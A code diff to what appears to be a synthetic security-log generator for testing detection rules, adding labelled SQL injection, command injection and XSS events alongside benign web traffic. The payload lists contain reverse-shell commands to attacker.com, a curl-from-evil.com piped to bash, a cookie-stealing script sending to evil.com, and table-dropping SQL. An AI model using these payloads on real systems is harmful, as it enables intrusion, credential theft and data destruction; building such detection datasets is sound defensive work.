@@ -235,6 +235,146 @@ def _gen_privilege_escalation(base_time: datetime, rng: random.Random) -> list:
     return events
 
 
+def _gen_sql_injection(base_time: datetime, rng: random.Random) -> list:
+    """T1190 — SQL Injection attacks via HTTP requests."""
+    events = []
+    src = rng.choice(EXTERNAL_IPS)
+    target = rng.choice(INTERNAL_IPS)
+    
+    sqli_payloads = [
+        "id=1' OR '1'='1",
+        "user=admin'--",
+        "search=' UNION SELECT username,password FROM users--",
+        "cat=1' AND 1=1--",
+        "login=' OR '1'='1'--",
+        "page=1' ORDER BY 10--",
+        "id=1' AND SLEEP(5)--",
+        "user=admin' UNION SELECT * FROM information_schema.tables--",
+        "cmd=1'; DROP TABLE users;--",
+        "search=1' OR 1=1 LIMIT 1--",
+    ]
+    
+    endpoints = ["/login", "/search", "/api/users", "/product", "/admin/query"]
+    
+    payload = rng.choice(sqli_payloads)
+    endpoint = rng.choice(endpoints)
+    url = f"http://app.internal{endpoint}?{payload}"
+    
+    events.append({
+        "timestamp": _ts(base_time),
+        "sourcetype": "web",
+        "src_ip": src,
+        "dest_ip": target,
+        "dest_port": 80,
+        "url": url,
+        "request": f"GET {endpoint}?{payload} HTTP/1.1",
+        "body": "",
+        "method": "GET",
+        "user_agent": rng.choice(["sqlmap/1.0", "Mozilla/5.0", "curl/7.68.0"]),
+        "event_type": "http",
+        "message": f"SQL Injection attempt: {payload[:40]}...",
+        "label": "malicious",
+        "attack_type": "sql_injection",
+        "mitre": "T1190"
+    })
+
+    return events
+
+
+def _gen_rce_attack(base_time: datetime, rng: random.Random) -> list:
+    """T1059/T1203 — Remote Code Execution via HTTP/command injection."""
+    events = []
+    src = rng.choice(EXTERNAL_IPS)
+    target = rng.choice(INTERNAL_IPS)
+    
+    rce_payloads = [
+        {"cmd": "; whoami", "body": "cmd=;whoami"},
+        {"cmd": "| nc -e /bin/sh 192.168.1.100 4444", "body": "host=|nc+-e+/bin/sh+attacker.com+4444"},
+        {"cmd": "`curl http://evil.com/shell.sh | bash`", "body": "name=`curl+http://evil.com/shell.sh+|+bash`"},
+        {"cmd": "$(python -c 'import socket,subprocess,os')", "body": "input=$(python+-c+'import+socket')"},
+        {"cmd": "; bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", "body": "cmd=;bash+-i+>%26+/dev/tcp/attacker.com/4444"},
+        {"cmd": "| python -c 'import socket,subprocess,os;s=socket.socket();s.connect(())'", "body": "data=|python+-c+'import+socket'"},
+        {"cmd": "; eval(base64_decode('c3lzdGVtKCJ3aG9hbWkiKTs='))", "body": "code=;eval(base64_decode(...))"},
+        {"cmd": "| perl -e 'use Socket;$i=\"1.2.3.4\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"))'", "body": "param=|perl+-e+'use+Socket'"},
+    ]
+    
+    endpoints = ["/api/run", "/cgi-bin/exec", "/admin/debug", "/test/cmd", "/tools/ping"]
+    
+    payload = rng.choice(rce_payloads)
+    endpoint = rng.choice(endpoints)
+    url = f"http://app.internal{endpoint}"
+    
+    events.append({
+        "timestamp": _ts(base_time),
+        "sourcetype": "web",
+        "src_ip": src,
+        "dest_ip": target,
+        "dest_port": 80,
+        "url": url,
+        "request": f"POST {endpoint} HTTP/1.1",
+        "body": payload["body"],
+        "command": payload["cmd"],
+        "method": "POST",
+        "user_agent": "Mozilla/5.0",
+        "event_type": "http",
+        "message": f"RCE attempt: {payload['cmd'][:40]}...",
+        "label": "malicious",
+        "attack_type": "rce",
+        "mitre": "T1059"
+    })
+
+    return events
+
+
+def _gen_xss_attack(base_time: datetime, rng: random.Random) -> list:
+    """T1189 — Cross-Site Scripting (XSS) attacks."""
+    events = []
+    src = rng.choice(EXTERNAL_IPS)
+    target = rng.choice(INTERNAL_IPS)
+    
+    xss_payloads = [
+        "<script>alert('XSS')</script>",
+        "<img src=x onerror=alert(1)>",
+        "javascript:alert('XSS')",
+        "<svg onload=alert(1)>",
+        "<body onload=alert('XSS')>",
+        "<iframe src=javascript:alert(1)>",
+        "'><script>document.location='http://evil.com?c='+document.cookie</script>",
+        "<input type=text onfocus=alert(1) autofocus>",
+        "<marquee onstart=alert(1)>",
+        "<details open ontoggle=alert(1)>",
+    ]
+    
+    fields = ["comment", "name", "search", "email", "message", "bio"]
+    endpoints = ["/post", "/profile", "/search", "/contact", "/feedback"]
+    
+    payload = rng.choice(xss_payloads)
+    field = rng.choice(fields)
+    endpoint = rng.choice(endpoints)
+    url = f"http://app.internal{endpoint}"
+    body = f"{field}={payload}"
+    
+    events.append({
+        "timestamp": _ts(base_time),
+        "sourcetype": "web",
+        "src_ip": src,
+        "dest_ip": target,
+        "dest_port": 80,
+        "url": url,
+        "request": f"POST {endpoint} HTTP/1.1",
+        "body": body,
+        "method": "POST",
+        "user_agent": rng.choice(["Mozilla/5.0", "<script>alert(1)</script>"]),
+        "event_type": "http",
+        "message": f"XSS attempt in {field}: {payload[:35]}...",
+        "label": "malicious",
+        "attack_type": "xss",
+        "mitre": "T1189"
+    })
+
+    return events
+
+
 # ═══ STEALTHY attack variants (harder to detect) ═════════════════════════════
 
 def _gen_slow_brute_force(base_time: datetime, rng: random.Random) -> list:
@@ -751,6 +891,96 @@ def _gen_normal_process(base_time: datetime, rng: random.Random) -> list:
     }]
 
 
+def _gen_normal_http(base_time: datetime, rng: random.Random) -> list:
+    """Normal HTTP web requests."""
+    events = []
+    src = rng.choice(INTERNAL_IPS)
+    endpoints = ["/home", "/about", "/products", "/contact", "/api/status", "/login"]
+    methods = ["GET", "POST"]
+    
+    endpoint = rng.choice(endpoints)
+    method = rng.choice(methods)
+    
+    # Benign parameters
+    if method == "GET":
+        if endpoint == "/products":
+            url = f"http://app.internal{endpoint}?category={rng.choice(['electronics', 'books', 'clothing'])}&page={rng.randint(1, 10)}"
+            body = ""
+        elif endpoint == "/search":
+            url = f"http://app.internal{endpoint}?q={rng.choice(['laptop', 'headphones', 'python book'])}"
+            body = ""
+        else:
+            url = f"http://app.internal{endpoint}"
+            body = ""
+    else:  # POST
+        url = f"http://app.internal{endpoint}"
+        if endpoint == "/login":
+            body = f"username={rng.choice(USERS)}&password=***REDACTED***"
+        elif endpoint == "/contact":
+            body = f"name=John&email=john@example.com&message=Hello"
+        else:
+            body = f"data={rng.randint(1000, 9999)}"
+    
+    events.append({
+        "timestamp": _ts(base_time),
+        "sourcetype": "web",
+        "src_ip": src,
+        "dest_ip": rng.choice(INTERNAL_IPS),
+        "dest_port": 80,
+        "url": url,
+        "request": f"{method} {endpoint} HTTP/1.1",
+        "body": body,
+        "method": method,
+        "user_agent": rng.choice([
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+        ]),
+        "event_type": "http",
+        "message": f"HTTP {method} {endpoint}",
+        "label": "benign",
+        "attack_type": "none"
+    })
+
+    return events
+
+
+def _gen_benign_api_call(base_time: datetime, rng: random.Random) -> list:
+    """Benign API calls that might look like injection attempts but aren't."""
+    events = []
+    src = rng.choice(INTERNAL_IPS)
+    
+    # These contain special characters but are benign
+    api_calls = [
+        {"url": "http://api.internal/search?q=error+in+log", "body": ""},
+        {"url": "http://api.internal/query", "body": "sql=SELECT+*+FROM+logs+WHERE+level=debug"},
+        {"url": "http://api.internal/log", "body": "message=Process+completed+with+exit+code+0"},
+        {"url": "http://api.internal/render?template=<div>{{title}}</div>", "body": ""},
+        {"url": "http://api.internal/debug?cmd=echo+hello+world", "body": ""},
+    ]
+    
+    call = rng.choice(api_calls)
+    
+    events.append({
+        "timestamp": _ts(base_time),
+        "sourcetype": "web",
+        "src_ip": src,
+        "dest_ip": rng.choice(INTERNAL_IPS),
+        "dest_port": 80,
+        "url": call["url"],
+        "request": f"GET {call['url'].split('/', 3)[-1]} HTTP/1.1" if call["body"] == "" else "POST /query HTTP/1.1",
+        "body": call["body"],
+        "method": "GET" if call["body"] == "" else "POST",
+        "user_agent": "InternalAPI-Client/1.0",
+        "event_type": "http",
+        "message": f"API call: {call['url'][:40]}...",
+        "label": "benign",
+        "attack_type": "none"
+    })
+
+    return events
+
+
 # ═══ Dataset Generation ══════════════════════════════════════════════════════
 
 # ═══ NEAR-MISS malicious variants (evade current threshold defaults) ══════════════
@@ -830,6 +1060,9 @@ ATTACK_GENERATORS = {
     "lateral_movement":     (_gen_lateral_movement, 10),
     "powershell_abuse":     (_gen_powershell_abuse, 18),
     "privilege_escalation": (_gen_privilege_escalation, 12),
+    "sql_injection":        (_gen_sql_injection, 15),
+    "rce":                  (_gen_rce_attack, 12),
+    "xss":                  (_gen_xss_attack, 10),
 }
 
 # Stealthy attacks (harder to detect — distinguishes good from great detection)
@@ -849,6 +1082,8 @@ BENIGN_GENERATORS = [
     (_gen_normal_dns, 80),
     (_gen_normal_firewall, 60),
     (_gen_normal_process, 50),
+    (_gen_normal_http, 100),        # Normal web traffic
+    (_gen_benign_api_call, 30),     # API calls that look like attacks but aren't
 ]
 
 # Noisy benign (designed to trigger false positives in naive rules)
